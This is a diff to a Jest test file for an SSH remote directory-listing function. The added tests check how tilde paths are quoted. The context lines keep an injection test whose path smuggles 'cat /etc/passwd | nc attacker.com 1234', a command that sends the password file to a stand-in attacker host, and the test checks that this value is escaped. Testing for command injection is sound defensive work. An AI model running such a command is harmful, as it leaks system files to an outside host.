@@ -136,5 +136,52 @@ describe("SSH Remote Listing", () => {
       expect(capturedCommand).toMatch(/\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234/);
       expect(capturedCommand).toMatch(/'ls -lAh .*\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234.*'/);
     });
+
+    it("should allow tilde expansion for paths starting with ~/", async () => {
+      const tildePath = "~/Desktop/subdir";
+
+      let capturedCommand = "";
+      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
+        capturedCommand = command;
+        callback(null, { stdout: "total 0\n", stderr: "" });
+      });
+
+      await executeRemoteLs(mockHostConfig, tildePath);
+
+      // The ~ should be outside quotes to allow remote shell expansion
+      // The path after ~/ should be escaped for safety
+      // The command should contain ~/ followed by the escaped path part
+      expect(capturedCommand).toMatch(/~/);
+      expect(capturedCommand).toMatch(/Desktop\/subdir/);
+      // The ~ should not be inside quotes (allowing remote shell to expand it)
+      // The path part should be escaped - the actual pattern is ~/'Desktop/subdir'
+      // which appears as ~/'\\''Desktop/subdir'\\''' in the escaped command
+      expect(capturedCommand).toMatch(/ls -lAh ~\/.*Desktop\/subdir/);
+      // Verify ~ is not inside quotes (it should appear before the escaped path)
+      const match = capturedCommand.match(/ls -lAh (.*)/);
+      expect(match).not.toBeNull();
+      if (match) {
+        const pathPart = match[1];
+        // The ~ should appear before any quotes
+        expect(pathPart).toMatch(/^~/);
+      }
+    });
+
+    it("should handle standalone tilde", async () => {
+      const tildePath = "~";
+
+      let capturedCommand = "";
+      (exec as any).mockImplementation((command: string, options: any, callback: any) => {
+        capturedCommand = command;
+        callback(null, { stdout: "total 0\n", stderr: "" });
+      });
+
+      await executeRemoteLs(mockHostConfig, tildePath);
+
+      // Standalone ~ should be unescaped to allow remote shell expansion
+      expect(capturedCommand).toMatch(/ls -lAh ~/);
+      // Should not be inside quotes
+      expect(capturedCommand).not.toMatch(/'~'/);
+    });
   });
 });
